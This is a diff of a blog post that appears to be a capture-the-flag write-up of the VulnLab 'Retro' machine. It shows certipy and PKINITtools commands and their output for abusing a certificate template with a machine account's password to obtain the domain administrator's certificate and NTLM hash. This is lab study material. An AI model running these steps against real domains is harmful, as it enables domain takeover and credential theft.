@@ -318,11 +318,24 @@ INFO: Done in 00M 04S
 
 <p>Then I can query the user <code class="language-plaintext highlighter-rouge">BANKING$</code> and I can see its <code class="language-plaintext highlighter-rouge">First Degree Group Membership</code> that this user is part of the group <code class="language-plaintext highlighter-rouge">DOMAIN COMPUTERS</code>, so we can use that user to exploit the certificate and retrieve the NTLM hash of the administrator.</p>
 
+<p>Lets retrieve the private key:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syl@sylsec:~/vulnlab/Retro$ certipy req -u 'BANKING$' -p 'Summer2018!' -dc-ip '10.10.64.243' -target 'dc.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator' -key-size 4096
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 13
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+</code></pre></div></div>
+
 <h1 id="unpac-the-hash-method-1">UnPAC the hash Method #1</h1>
 
 <p>We can use the technique UnPAC the hash to get the NTLM hash using the <a target="_blank" href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a>.</p>
 
-<p>First we need to retrieve the TGT and the AS-REP encryption key</p>
+<p>First we need to retrieve the TGT and the AS-REP encryption key.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syl@sylsec:~/vulnlab/Retro/temp$ gettgtpkinit -cert-pfx ../exfiltrated/administrator.pfx -dc-ip 10.10.113.62 retro.vl/administrator ../exfiltrated/administrator.ccache 
 2023-12-19 20:53:00,328 minikerberos INFO     Loading certificate and key from file
@@ -350,17 +363,7 @@ Recovered NT Hash
 
 <h1 id="using-certipy-method-2">Using Certipy Method #2</h1>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syl@sylsec:~/vulnlab/Retro$ certipy req -u 'BANKING$' -p 'Summer2018!' -dc-ip '10.10.64.243' -target 'dc.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator' -key-size 4096
-Certipy v4.8.2 - by Oliver Lyak (ly4k)
-
-[*] Requesting certificate via RPC
-[*] Successfully requested certificate
-[*] Request ID is 13
-[*] Got certificate with UPN 'administrator'
-[*] Certificate has no object SID
-[*] Saved certificate and private key to 'administrator.pfx'
-
-syl@sylsec:~/vulnlab/Retro$ certipy auth -pfx ./exfiltrated/administrator.pfx -dc-ip '10.10.64.243' -username 'administrator' -domain retro.vl
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syl@sylsec:~/vulnlab/Retro$ certipy auth -pfx ./exfiltrated/administrator.pfx -dc-ip '10.10.64.243' -username 'administrator' -domain retro.vl
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Using principal: administrator@retro.vl
